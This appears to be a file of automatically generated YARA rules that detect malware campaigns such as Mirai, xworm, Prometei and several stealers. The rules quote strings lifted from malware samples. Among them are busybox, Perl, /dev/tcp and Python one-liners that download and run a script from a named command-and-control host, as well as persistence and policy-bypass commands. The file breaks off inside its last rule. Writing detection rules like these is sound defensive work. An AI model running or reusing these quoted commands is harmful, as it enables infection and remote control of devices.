rule Sightlines_tlsh_a8fb433e_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a8fb433e"
        date = "2026-11-01"
        campaign = "tlsh-a8fb433e"
        family = "mirai"
        hash = "03ff23bec6ef5c598dd1bbda72b789d0de03a3d6014fd3ba336d78cb6c4bc073"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a8fb433e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "mHoIJPqGRSTUVWXL\\s]Yrp|{nzt[D&'()*+,-./0123456789:;<=@A%$FuvwxyE}~l" ascii
        $s1 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s2 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s3 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s4 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s5 = "Content-Type: application/json" ascii
        $s6 = "/bin/busybox hostname PBOC" ascii
        $s7 = "GET /api/v1/status HTTP/1.1" ascii
        $s8 = "/bin/busybox wget http://" ascii
        $s9 = "POST /api/sync HTTP/1.1" ascii
        $s10 = "/bin/busybox echo -ne " ascii
        $s11 = "/bin/busybox echo > " ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 9 of them
}

rule Sightlines_tlsh_f4224959_rustystealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f4224959"
        date = "2026-11-01"
        campaign = "tlsh-f4224959"
        family = "rustystealer"
        hash = "0f666aca307f7fd2b974cfbff8da7054e71346d7368ee930049dcfea53edf5ef"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f4224959.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "assertion failed: min_bits >= MIN_BITS/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/rin" ascii
        $s1 = "called `Result::unwrap()` on an `Err` value/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557" ascii
        $s2 = "SizeLimitExhaustedParseIntErrorkindInvalidDigitPosOverflowNegOverflowZeroNotAPowerOfTwo/rustc/b94008" ascii
        $s3 = "assertion failed: len >= size_of::<c::sockaddr_in>()/rustc/b940084d7eb6a299eb4bfeb8e34901bc051e7ac4/" ascii
        $s4 = "Cunsafe extern \"\" -fn( ->  + : punycode{}.llvm./rust/deps\\rustc-demangle-0.1.28\\src\\lib.rs" ascii
        $s5 = "Punycode overflows should not be possible due to PUNYCODE_ENCODE_MAX_INPUT_LENGTH" ascii
        $s6 = "assertion failed: value <= self.max_value()/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557" ascii
        $s7 = "CHUNK_SIZE_MAX_BYTES should fit any usize" ascii
        $s8 = "CertificateCompressionAlgorithmsecp256r1secp384r1secp521r1X25519X448CertificateTypeNamedGroupFFDHE20" ascii
        $s9 = "Proxy-Authorization: /root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/hyper-util-0.1.21/sr" ascii
        $s10 = "sample of invalid length/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/rustls-0.23.45/sr" ascii
        $s11 = "too many active read locks on RwLock/rustc/b940084d7eb6a299eb4bfeb8e34901bc051e7ac4/library\\std\\src\\" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4484096 and 12 of them
}

rule Sightlines_tlsh_f00349fb_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f00349fb"
        date = "2026-11-01"
        campaign = "tlsh-f00349fb"
        family = "mirai"
        hash = "0e7ef938ce64d70f296e4fcba5280ded09b83f0350f3365b7d271e5c841b565e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f00349fb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "cat > \"$d/network-dispatch.service\" <<EOF" ascii
        $s1 = "{\"id\":\"%s\",\"cmp\":\"%s\",\"stage\":\"beacon\",\"uptime\":%u,\"token\":\"eyJhbGciOiJIUzI1NiJ9.decoy.token\"}" ascii
        $s2 = "ln -sf \"$d/network-dispatch.service\" \"$d/multi-user.target.wants/network-dispatch.service\"" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s4 = "/root/.config/systemd/user/network-dispatch.service" ascii
        $s5 = "/etc/udev/rules.d/99-network-dispatch.rules" ascii
        $s6 = "Cache-Control: no-cache, no-store, must-revalidate" ascii
        $s7 = "option post_install_hook /etc/init.d/network-dispatch" ascii
        $s8 = "rc_startup=/etc/init.d/network-dispatch start" ascii
        $s9 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6" ascii
        $s10 = "/etc/xdg/autostart/network-dispatch.desktop" ascii
        $s11 = "SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_3729e6a6_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3729e6a6"
        date = "2026-11-01"
        campaign = "tlsh-3729e6a6"
        family = "mirai"
        hash = "03df0e485f3e3e8388810b650459a92268da897f226c2c5af3331e22498eba99"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3729e6a6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/etc/config/resolv.conf" ascii
        $s1 = "/etc/config/hosts" ascii
        $s2 = "/proc/%d/exe" ascii
        $s3 = "Cx}1Kx}PSxK" ascii
        $s4 = "x}'Kx}j[x8" ascii
        $s5 = "}CX.}CSxN" ascii
        $s6 = "}CSx}e[x" ascii
        $s7 = "}e[x}CSx" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 7 of them
}

rule Sightlines_tlsh_be834a1e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-be834a1e"
        date = "2026-11-01"
        campaign = "tlsh-be834a1e"
        family = ""
        hash = "0425643406699d9cc2b324b57159a7c47e764cbcb675fb726c7c848368e7566e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-be834a1e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "gram Files (x86)\\Microsoft\\Edge\\Application<C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge" wide
        $s1 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" ascii
        $s2 = "%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe" ascii
        $s3 = "Browse the webN..\\..\\..\\..\\..\\..\\..\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe1C:\\Pro" wide
        $s4 = "S-1-5-21-3770711202-144915035-821745494-1000" wide
        $s5 = "@shell32.dll,-21817" wide
        $s6 = "desktop-torc4or" ascii
        $s7 = "MICROS~1" ascii
        $s8 = "APPLIC~1" ascii
        $s9 = "PROGRA~2" ascii
    condition:
        filesize < 1048576 and 8 of them
}

rule Sightlines_contacted_d0c7d75d_salatstealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign contacted-d0c7d75d"
        date = "2026-11-01"
        campaign = "contacted-d0c7d75d"
        family = "salatstealer"
        hash = "02fa9c7b88f443b451e7f03bdb723558cc8db7c35eee130e3fd17429813b00c4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/contacted-d0c7d75d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "GBZAP-PACK-UNIQUE" ascii
        $s1 = "KbpxF9v|1<`J~|" ascii
        $s2 = "{}z4:RHGd,X,NB" ascii
        $s3 = "'i]m&yNefvj}" ascii
        $s4 = "BzawNgE[Q|K`" ascii
        $s5 = "Gz4!d|#D<Ogb" ascii
        $s6 = "im|5?2K0l}\\4" ascii
        $s7 = "Cneq^6!+KezX" ascii
        $s8 = "F:[`qIQAC>tQ" ascii
        $s9 = "!amb)&zg-s3" ascii
        $s10 = "=:0<,8OADcK" ascii
        $s11 = "MI{O*qR%!h5" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 7186108 and 12 of them
}

rule Sightlines_tlsh_c379773e_xworm
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c379773e"
        date = "2026-11-01"
        campaign = "tlsh-c379773e"
        family = "xworm"
        hash = "3d3362f1bd817c6c92aea1a2f3245ffa792c039803c0694319a8adcca57fbf0c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c379773e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "Content-Type: application/x-www-form-urlencoded" wide
        $s4 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" ascii
        $s5 = "SELECT * FROM Win32_VideoController" wide
        $s6 = "-ExecutionPolicy Bypass -File \"" wide
        $s7 = "Win32_Processor.deviceid=\"CPU0\"" wide
        $s8 = "Select * from AntivirusProduct" wide
        $s9 = "m_MyWebServicesObjectProvider" ascii
        $s10 = "OfflineKeylogger Not Enabled" wide
        $s11 = "ThreadSafeObjectProvider`1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_rich_header_hash_cc407ac9_prometei
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-cc407ac9"
        date = "2026-11-01"
        campaign = "rich_header_hash-cc407ac9"
        family = "prometei"
        hash = "0cb4cfb991e82c52a7904bc6cee3c10eac1adb6bf84cbbfd0b2629d0aa35781a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-cc407ac9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Host Process for Windows Service" wide
        $s1 = "abnormal program termination" ascii
        $s2 = "- floating point not loaded" ascii
        $s3 = "GAIsProcessorFeaturePresent" ascii
        $s4 = "GetLogicalDriveStringsA" ascii
        $s5 = "Copyright (C) 2016" wide
        $s6 = "IsBadWritePtr" ascii
        $s7 = "IsBadCodePtr" ascii
        $s8 = "\\dH1#)AGp{2" ascii
        $s9 = "sqhost.exe" wide
        $s10 = "okmLCS[]<" ascii
        $s11 = "5 eDCV;," ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_contacted_80f44769_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign contacted-80f44769"
        date = "2026-11-01"
        campaign = "contacted-80f44769"
        family = "mirai"
        hash = "09ecd3f48335934c1715b0abe0c0b46aa1ee44ad3bf8566351230549ef3a391a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/contacted-80f44769.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s1 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s2 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s3 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s4 = "\"\\x23\\x21\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x0A\\x0A\\x66\\x6F\\x72\\x20\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x20\\x6" ascii
        $s5 = "Content-Type: application/json" ascii
        $s6 = "/bin/busybox hostname PBOC" ascii
        $s7 = "GET /api/v1/status HTTP/1.1" ascii
        $s8 = "/bin/busybox wget http://" ascii
        $s9 = "POST /api/sync HTTP/1.1" ascii
        $s10 = "/bin/busybox echo -ne " ascii
        $s11 = "/bin/busybox echo > " ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 4 of them
}

rule Sightlines_tlsh_d6b469e8_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d6b469e8"
        date = "2026-11-01"
        campaign = "tlsh-d6b469e8"
        family = "mirai"
        hash = "33ea1f70372c9a472bea64f68dba54a92c392abb09219a60af8db246495b53e7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d6b469e8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii
        $s1 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
        $s2 = "e365`70;9ag:<$ef1=d?2>T" ascii
        $s3 = "509=:efg`" ascii
        $s4 = "5::=1fdef" ascii
        $s5 = ".-50efg`" ascii
        $s6 = "$662*7!E" ascii
        $s7 = "7<5:3191" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 8 of them
}

rule Sightlines_tlsh_b536c7da_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b536c7da"
        date = "2026-11-01"
        campaign = "tlsh-b536c7da"
        family = "mirai"
        hash = "101b92a8d3f4074c4b6ecd21721e80579fa01474a9cc7b62b97ac8bf88ab3d00"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b536c7da.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii
        $s1 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
        $s2 = "e365`70;9ag:<$ef1=d?2>T" ascii
        $s3 = "509=:efg`" ascii
        $s4 = "5::=1fdef" ascii
        $s5 = ".-50efg`" ascii
        $s6 = "$662*7!E" ascii
        $s7 = "7<5:3191" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 8 of them
}

rule Sightlines_tlsh_57ecf368_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-57ecf368"
        date = "2026-11-01"
        campaign = "tlsh-57ecf368"
        family = ""
        hash = "13ce2b57b35b9a0223b0ea2782752bd2e20f550e2b7f0e9de8ae8d3999bfd402"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-57ecf368.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "    Write-Host \"[INFO] Starting DPI TCP 16-20 checks (parallel: $MaxParallel)...\" -ForegroundColor D" ascii
        $s1 = "if ($env:MONITOR_MAX_PARALLEL) { [int]$dpiMaxParallel = $env:MONITOR_MAX_PARALLEL }" ascii
        $s2 = "if ($env:MONITOR_RANGE) { [int]$dpiRangeBytes = $env:MONITOR_RANGE }" ascii
        $s3 = "    $proc = Start-Process -FilePath \"cmd.exe\" -ArgumentList \"/c `\"$($file.FullName)`\"\" -WorkingDirec" ascii
        $s4 = "    Write-Host \"[INFO] Targets: $($Targets.Count) (custom URL overrides suite). Range: $rangeSpec by" ascii
        $s5 = "if ($env:MONITOR_TIMEOUT) { [int]$dpiTimeoutSeconds = $env:MONITOR_TIMEOUT }" ascii
        $s6 = "if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {" ascii
        $s7 = "    Write-Host \"  [$configNum/$($batFiles.Count)] $($file.Name)\" -ForegroundColor Yellow" ascii
        $s8 = "# DPI checker defaults (override via MONITOR_* env vars like in monitor.ps1)" ascii
        $s9 = "    $url = \"https://hyperion-cs.github.io/dpi-checkers/ru/tcp-16-20/suite.v2.json\"" ascii
        $s10 = "$batFiles = Get-ChildItem -Path $targetDir -Filter \"*.bat\" | Where-Object { $_.Name -notlike \"servic" ascii
        $s11 = "    Write-Host \"[WARNING] Ipset will be switched to 'any' for accurate DPI tests.\" -ForegroundColor " ascii
    condition:
        filesize < 1048576 and 9 of them
}

rule Sightlines_host_1f477a31_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-1f477a31"
        date = "2026-11-01"
        campaign = "host-1f477a31"
        family = ""
        hash = "197786c1b9008c2b87a5ae1db7d977a444bd4e658a95db1b92f0c594af637331"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-1f477a31.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "systemctl disable waternetwork.service 2>/dev/null" ascii
        $s1 = "systemctl enable waternetwork.service 2>/dev/null" ascii
        $s2 = "/etc/systemd/system/waternetwork.service" ascii
        $s3 = "systemctl daemon-reload 2>/dev/null" ascii
        $s4 = "Accept-Language: en-US,en;q=0.9" ascii
        $s5 = "Description=Water Network Service" ascii
        $s6 = "Accept-Encoding: gzip, deflate" ascii
        $s7 = "/etc/cron.d/waternetwork" ascii
        $s8 = "Cache-Control: no-cache" ascii
        $s9 = "Connection: keep-alive" ascii
        $s10 = "bile Safari/537.36" ascii
        $s11 = "After=network.target" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_6a4fa696_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-6a4fa696"
        date = "2026-11-01"
        campaign = "dotnet_typelib_guid-6a4fa696"
        family = ""
        hash = "08bed8100f8732e0c95846ea6a87f0c04559cb38ba5e4825b0248a5a5e94051c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-6a4fa696.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "NXFuscator [ Free obfuscator ] v1.0.0.2 | Discord https://discord.gg/sU6Cv4MGev" ascii
        $s2 = "      <!--<supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\" />-->" ascii
        $s3 = "      <!--<supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\" />-->" ascii
        $s4 = "      <!--<supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\" />-->" ascii
        $s5 = "      <!--<supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\" />-->" ascii
        $s6 = "      <!--<supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\" />-->" ascii
        $s7 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s8 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\">" ascii
        $s9 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s10 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s11 = "$WDLoader.Program+<BlockAvSites>d__16" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_3ca58c93_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-3ca58c93"
        date = "2026-10-31"
        campaign = "dotnet_typelib_guid-3ca58c93"
        family = ""
        hash = "1fbf0c7a8e4c7371af8fc016b1e25099a78b673a42342f43367c42f98cb0c5b6"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-3ca58c93.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" ascii
        $s1 = "RegExPatternsDropDownList.DefaultModifiers" wide
        $s2 = "]Regular Expression Pattern to use for validation.  See accompanied regular expression bank..." ascii
        $s3 = "'System.Globalization.DateTimeFormatInfo+" ascii
        $s4 = "lType of comparison to perform with ValueToCompare.  Default is data type checking if DataType is no" ascii
        $s5 = "+System.Globalization.GregorianCalendarTypes" ascii
        $s6 = "2Message to display/return iwhen validation failed." ascii
        $s7 = "AI-driven multi-domain data validation and integrity assurance framework with adaptive rule orchestr" wide
        $s8 = "_Highest value the control can have.  Remember to set DataType when range is not of type String." ascii
        $s9 = "<Case sensitivity validation works best with String DataType." ascii
        $s10 = "iAI-driven multi-domain data validation and integrity assurance framework with adaptive rule orchest" ascii
        $s11 = "^Lowest value the control can have.  Remember to set DataType when range is not of type String." ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2161664 and 12 of them
}

rule Sightlines_c2_cdaf0081_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-cdaf0081"
        date = "2026-10-30"
        campaign = "c2-cdaf0081"
        family = ""
        hash = "16b57b99dc934f4d30b42fecf04c82c716136759e2a85baba4d8fcc528ef4599"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-cdaf0081.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "for /f \"delims=\" %%A in ('powershell -NoProfile -Command \"(Invoke-WebRequest -Uri \\\"%GITHUB_VERSION_" ascii
        $s1 = "    call :PrintRed \"https://github.com/ValdikSS/GoodbyeDPI/issues/541#issuecomment-2661670982\"" ascii
        $s2 = "ACTIVE_*') { Write-Output ('FAKE' + [char]124 + $file.BaseName + [char]124 + (Get-FileHash -LiteralP" ascii
        $s3 = "sc create %SRVCNAME% binPath= \"\\\"%BIN_PATH%winws.exe\\\" !ARGS!\" DisplayName= \"zapret\" start= auto" ascii
        $s4 = "set \"GITHUB_VERSION_URL=https://raw.githubusercontent.com/boymep/zapret/main/.service/version.txt\"" ascii
        $s5 = "URL%\\\" -Headers @{\\\"Cache-Control\\\"=\\\"no-cache\\\"} -UseBasicParsing -TimeoutSec 5).Content.Trim()\" 2^" ascii
        $s6 = "char]124 + (Get-FileHash -LiteralPath $item.Name -Algorithm SHA256).Hash) } }; $files = @(Get-ChildI" ascii
        $s7 = "powershell -NoProfile -Command \"if ('%~dp0' -match '[\\u0430-\\u044F\\u0410-\\u042F\\u0451\\u0401]') { exi" ascii
        $s8 = "echo Changing ports for %~1 (example: 1024-1934,1936-65535, default: 1024-65535)" ascii
        $s9 = "set \"GITHUB_DOWNLOAD_URL=https://github.com/boymep/zapret/releases/latest\"" ascii
        $s10 = "for /f \"delims=\" %%a in ('powershell -NoProfile -Command \"Get-ChildItem -Recurse -Path 'HKLM:System\\" ascii
        $s11 = "{ $_.DohFlags -gt 0 } | Measure-Object | Select-Object -ExpandProperty Count\"') do (" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_505076db_adwareoffercore
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-505076db"
        date = "2026-10-31"
        campaign = "tlsh-505076db"
        family = "adwareoffercore"
        hash = "023120cef031fb5530d0c3c36fec36ff413583ab72f4f93dbc40208d4902e8dc"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-505076db.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s2 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s3 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s4 = "%TObjectList<System.Classes.TRegGroup>4EH" ascii
        $s5 = "Embarcadero Delphi for Win32 compiler version 36.0 (29.0.55362.2017)" ascii
        $s6 = "        <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s7 = "        <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
        $s8 = "        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s9 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s10 = "VTEnumerable<System.Generics.Collections.TPair<System.TypInfo.PTypeInfo,System.string>>'" ascii
        $s11 = "VTEnumerable<System.Generics.Collections.TPair<System.string,System.TypInfo.PTypeInfo>>'" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 5893894 and 12 of them
}

rule Sightlines_tlsh_86b466de_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-86b466de"
        date = "2026-11-01"
        campaign = "tlsh-86b466de"
        family = "mirai"
        hash = "73d736df7044740dbfce4f00b37b7f2b12489523272f9502ab1b4c33790bafb7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-86b466de.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s11 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3622848 and 12 of them
}

rule Sightlines_tlsh_78aaeafc_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-78aaeafc"
        date = "2026-11-01"
        campaign = "tlsh-78aaeafc"
        family = "mirai"
        hash = "12eca53696eaae812868f83ae6f4231342ae07fad1ea26919184a1b41f606d77"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-78aaeafc.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "L3a L3i(L3q0L3y8H" ascii
        $s1 = "L3c L3k(L3s0L3{8H" ascii
        $s2 = "IcL$dIcT$`Mct$TL" ascii
        $s3 = "t[AWAVAUATUSH" ascii
        $s4 = "tSAWAVAUATUSH" ascii
        $s5 = "SUWVATAUAVAWH" ascii
        $s6 = "L$8AkL$t&Mc" ascii
        $s7 = "A;G,u(HcD$" ascii
        $s8 = "t$0L;p ~kH" ascii
        $s9 = "t1H9\\$ v*L" ascii
        $s10 = "BAWAVAUATUSH" ascii
        $s11 = "D$`H9D$huGH" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 6746688 and 9 of them
}

rule Sightlines_tlsh_b9d340c4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b9d340c4"
        date = "2026-11-01"
        campaign = "tlsh-b9d340c4"
        family = ""
        hash = "0888ee97db33d39719fcae5493adddd48c06cf483e5fb5f70ed342227eb314f2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b9d340c4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s1 = "((tcp.Ack and tcp.Syn or tcp.Rst or tcp.Fin) or (tcp.PayloadLength>=12 and tcp.Payload32[0]==0x48545" ascii
        $s2 = "      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/> " ascii
        $s3 = "      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/> " ascii
        $s4 = "WARNING !!! possible TRASH FLOOD configuration detected in profile %d" ascii
        $s5 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s6 = " --filter-l7=[http|tls|quic|wireguard|dht|discord|stun|unknown] ; L6-L7 protocol filter. multiple co" ascii
        $s7 = " inflate 1.3.1 Copyright 1995-2024 Mark Adler " ascii
        $s8 = "; perform TCP split handshake : send SYN only, SYN+ACK or ACK+SYN" ascii
        $s9 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkCards" ascii
